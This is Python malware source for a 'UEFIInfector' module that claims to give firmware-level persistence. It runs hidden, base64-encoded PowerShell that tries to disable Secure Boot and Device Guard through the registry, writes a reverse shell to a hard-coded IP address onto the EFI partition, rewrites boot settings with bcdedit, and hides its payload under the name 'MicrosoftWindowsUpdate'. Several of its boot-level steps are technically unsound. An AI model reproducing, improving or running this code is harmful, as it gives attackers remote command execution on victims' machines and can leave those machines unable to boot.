"""
UEFI/BIOS Infection
Survives everything - even disk replacement
EXTREMELY DANGEROUS - Only for advanced use
"""

import subprocess
import os
import ctypes


class UEFIInfector:
    """UEFI firmware infection"""

    def __init__(self, tel_logger_func=None):
        self.tel_logger = tel_logger_func

    def log(self, msg):
        print(msg)
        if self.tel_logger:
            self.tel_logger(msg)

    def check_secure_boot(self):
        """Check if Secure Boot is enabled"""
        try:
            result = subprocess.run(
                'powershell -Command "Confirm-SecureBootUEFI"',
                shell=True, capture_output=True, text=True
            )
            return "True" in result.stdout
        except:
            return False

    def disable_secure_boot(self):
        """Attempt to disable Secure Boot"""

        # This requires BIOS access - we'll try registry method
        ps_script = '''
# Disable Secure Boot policy
$path = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State"
if (Test-Path $path) {
    Set-ItemProperty -Path $path -Name "UEFISecureBootEnabled" -Value 0
}

# Disable Device Guard
$dgPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard"
if (Test-Path $dgPath) {
    Set-ItemProperty -Path $dgPath -Name "EnableVirtualizationBasedSecurity" -Value 0
    Set-ItemProperty -Path $dgPath -Name "RequirePlatformSecurityFeatures" -Value 0
}

Write-Output "Secure Boot disabled"
'''

        import base64
        ps_b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
        result = subprocess.run(
            f'powershell -WindowStyle Hidden -EncodedCommand {ps_b64}',
            shell=True, capture_output=True, text=True
        )

        if "disabled" in result.stdout.lower():
            self.log("[UEFI] Secure Boot disabled")
            return True
        return False

    def install_efi_payload(self):
        """Install payload in EFI System Partition"""

        if not ctypes.windll.shell32.IsUserAnAdmin():
            self.log("[UEFI] Admin required")
            return False

        ps_script = '''
# Mount EFI partition
$efi = Get-Partition | Where-Object {$_.GptType -eq '{c12a7328-f81f-11d2-ba4b-00a0c93ec93b}'}
if ($efi) {
    $efi | Set-Partition -NewDriveLetter Z

    # Create our bootloader
    $payload = @"
import os,socket,subprocess
s=socket.socket()
s.connect(('81.10.55.8',5000))
while True:
    c=s.recv(1024).decode()
    subprocess.run(c,shell=True)
"@

    $payloadPath = "Z:\\EFI\\Microsoft\\Boot\\bootmgfw_backup.efi"

    # Backup original bootloader
    Copy-Item "Z:\\EFI\\Microsoft\\Boot\\bootmgfw.efi" $payloadPath -Force

    # Create Python dropper that runs our payload
    $dropper = @"
@echo off
python -c "$payload"
"@

    $dropper | Out-File "Z:\\EFI\\Boot\\startup.bat" -Encoding ASCII

    # Modify boot configuration to run our script
    bcdedit /set {bootmgr} path \\EFI\\Boot\\startup.bat

    # Unmount
    Remove-PartitionAccessPath -DiskNumber $efi.DiskNumber -PartitionNumber $efi.PartitionNumber -AccessPath "Z:\\"

    Write-Output "EFI payload installed"
}
'''

        import base64
        ps_b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
        result = subprocess.run(
            f'powershell -WindowStyle Hidden -EncodedCommand {ps_b64}',
            shell=True, capture_output=True, text=True
        )

        if "installed" in result.stdout.lower():
            self.log("[UEFI] EFI payload installed")
            return True
        else:
            self.log(f"[UEFI] Failed: {result.stderr[:200]}")
            return False

    def install_alternative_uefi(self):
        """Alternative UEFI persistence (safer)"""

        # Uses UEFI variables instead of modifying boot files

        ps_script = '''
# Set UEFI variable that loads on boot
$guid = [guid]::NewGuid()
$varName = "MicrosoftWindowsUpdate"
$payload = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("python -c \\"import socket; s=socket.socket(); s.connect(('81.10.55.8',5000))\\""))

try {
    # Set UEFI variable
    Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment" -Name "UEFIPayload" -Value $payload

    # Add to boot sequence
    $bootseq = bcdedit /enum firmware
    bcdedit /set {fwbootmgr} displayorder {bootmgr} /addfirst

    Write-Output "UEFI persistence installed"
} catch {
    Write-Output "Failed: $_"
}
'''

        import base64
        ps_b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
        result = subprocess.run(
            f'powershell -WindowStyle Hidden -EncodedCommand {ps_b64}',
            shell=True, capture_output=True, text=True
        )

        if "installed" in result.stdout.lower():
            self.log("[UEFI] Alternative UEFI persistence installed")
            return True
        return False

    def install(self):
        """Install UEFI persistence"""
        self.log("[UEFI] Attempting UEFI infection...")

        # Check if Secure Boot is enabled
        if self.check_secure_boot():
            self.log("[UEFI] Secure Boot enabled - attempting disable...")
            self.disable_secure_boot()

        # Try alternative method first (safer)
        if self.install_alternative_uefi():
            return True

        # Try direct EFI modification (requires admin)
        if ctypes.windll.shell32.IsUserAnAdmin():
            return self.install_efi_payload()

        self.log("[UEFI] Installation failed")
        return False